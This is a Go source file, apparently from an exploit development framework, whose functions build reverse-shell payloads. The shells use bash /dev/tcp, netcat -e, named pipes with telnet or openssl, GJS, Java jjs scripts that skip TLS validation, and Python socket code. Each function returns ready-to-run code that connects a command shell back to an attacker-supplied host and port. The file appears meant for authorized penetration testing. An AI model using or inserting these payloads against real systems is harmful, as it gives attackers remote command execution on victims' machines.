package payload

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

func ReverseShellBash(lhost string, lport int) string {
	return fmt.Sprintf("bash -c 'bash &> /dev/tcp/%s/%d <&1'", lhost, lport)
}

func ReverseShellNetcatGaping(lhost string, lport int) string {
	// busybox nc expects the command to end with the -e option (when in use)
	return fmt.Sprintf("nc %s %d -e /bin/sh", lhost, lport)
}

func ReverseShellMknodTelnet(lhost string, lport int, colon bool) string {
	node := random.RandLetters(3)

	if colon {
		return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | telnet %s:%d > %s; rm %s;`, node, node, lhost, lport, node, node)
	}

	return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | telnet %s %d > %s; rm %s;`, node, node, lhost, lport, node, node)
}

func ReverseShellMkfifoTelnet(lhost string, lport int, colon bool) string {
	fifo := random.RandLetters(3)

	if colon {
		return fmt.Sprintf(`cd /tmp; mkfifo %s; telnet %s:%d 0<%s | sh 1>%s; rm %s;`, fifo, lhost, lport, fifo, fifo, fifo)
	}

	return fmt.Sprintf(`cd /tmp; mkfifo %s; telnet %s %d 0<%s | sh 1>%s; rm %s;`, fifo, lhost, lport, fifo, fifo, fifo)
}

func ReverseShellMknodOpenSSL(lhost string, lport int) string {
	node := random.RandLetters(3)

	return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | openssl s_client -quiet -connect %s:%d > %s; rm %s;`, node, node,
		lhost, lport, node, node)
}

func ReverseShellMkfifoOpenSSL(lhost string, lport int) string {
	fifo := random.RandLetters(3)

	return fmt.Sprintf(`cd /tmp; mkfifo %s; sh -i < %s 2>&1 | openssl s_client -quiet -connect %s:%d > %s; rm %s;`, fifo, fifo,
		lhost, lport, fifo, fifo)
}

// Generates a script that can be used to create a reverse shell via
// gjs (Gnome JS - present on Ubuntu, Debian by default).
func ReverseShellGJSScript(lhost string, lport int) string {
	return fmt.Sprintf(`const Gio = imports.gi.Gio;
const GLib = imports.gi.GLib;

try {
	let connection = (new Gio.SocketClient()).connect_to_host("%s:%d", null, null);
	let output = connection.get_output_stream();
	let input = new Gio.DataInputStream({ base_stream: connection.get_input_stream() });

	while (true) {
		let [cmd, size] = input.read_line(null);
		let [res, out, err, status] = GLib.spawn_command_line_sync(imports.byteArray.toString(cmd));
		output.write_bytes(new GLib.Bytes(imports.byteArray.toString(out)), null);
	}
} catch (e) {
}`, lhost, lport)
}

// Generates a script that can be used to create a reverse shell via jjs (Java javascript).
// This is an adapted version of Frohoff's OG gist. Additionally, the disabling of TLS validation
// logic was adapted from a blog written by Callan Howell-Pavia.
//
// The script will autodetect if the platform is Windows and provide a 'cmd.exe' shell. Otherwise
// bash is used.
//
// https://redthunder.blog/2018/04/09/disabling-hostname-validation-in-nashorn-javascript/
// https://gist.github.com/frohoff/8e7c2bf3737032a25051
func ReverseShellJJSScript(lhost string, lport int, ssl bool) string {
	script := `var shell = "bash";
if (java.lang.System.getProperty("os.name").indexOf("Windows") != -1) {
	shell = "cmd.exe";
}
var p=new java.lang.ProcessBuilder(shell).redirectErrorStream(true).start();`
	if ssl {
		script += fmt.Sprintf(`
var X509TrustManager = Java.type("javax.net.ssl.X509TrustManager");
var permissiveTrustManager = Java.extend(X509TrustManager,
  {
    getAcceptedIssuers: function(){return null;},
    checkClientTrusted: function(certs, authType){return;},
    checkServerTrusted: function(certs, authType){return;}
  }
);
var trustAllCerts = [new permissiveTrustManager()];
var sc = javax.net.ssl.SSLContext.getInstance("TLS");
sc.init(null, trustAllCerts, new java.security.SecureRandom());
var factory = sc.getSocketFactory();
var s=factory.createSocket("%s", %d);
s.startHandshake()`, lhost, lport)
	} else {
		script += fmt.Sprintf(`var s=new java.net.Socket(%q, %d);`, lhost, lport)
	}
	script += `
var socketInput = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream()));
var socketOutput = new java.io.BufferedWriter(new java.io.OutputStreamWriter(s.getOutputStream()));
var processInput = new java.io.BufferedWriter(new java.io.OutputStreamWriter(p.getOutputStream()));
var processOutput = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));

while (!s.isClosed()) {
	var data
	if ((data = socketInput.readLine()) != null) {
		processInput.write(data + "\n");
		processInput.flush()
	}
	java.lang.Thread.sleep(50);

	while (processOutput.ready() && (data = processOutput.read()) > 0) {
			socketOutput.write(data);
	}
	socketOutput.flush()
	try {
		p.exitValue();
		break;
	} catch (e) {
	}
}

p.destroy();
s.close();`

	return script
}

// An unflattened reverse shell that works on Python 2.7, 3+, Windows and Linux.
func UnflattenedReversePython27(lhost string, lport int) string {
	return fmt.Sprintf("import socket\n"+
		"import subprocess\n"+
		"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"+
		"s.connect(('%s', %d))\n"+
		"while 1:\n"+
		"    data = s.recv(1024).decode('UTF-8')\n"+
		"    if data == 'exit\\n':\n"+
		"        break\n"+
		"    if len(data) > 0:\n"+
		"        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n"+
		"        s.send(proc.stdout.read() + proc.stderr.read())\n"+
		"s.close()\n", lhost, lport)
}

// An unflattened reverse shell that uses an SSL socket, works on Python 2.7, 3+, Windows and Linux.
func UnflattenedSecureReversePython27(lhost string, lport int) string {
	return fmt.Sprintf("import socket\n"+
		"import subprocess\n"+
		"import ssl\n"+
		"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"+
		"s.connect(('%s', %d))\n"+
		"sslsock = ssl.wrap_socket(s, cert_reqs=ssl.CERT_NONE)\n"+
		"while 1:\n"+
		"    data = sslsock.recv(1024).decode('UTF-8')\n"+
		"    if data == 'exit\\n':\n"+
		"        break\n"+
		"    if len(data) > 0:\n"+
		"        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n"+
		"        sslsock.send(proc.stdout.read() + proc.stderr.read())\n"+
		"sslsock.close()\n", lhost, lport)
}
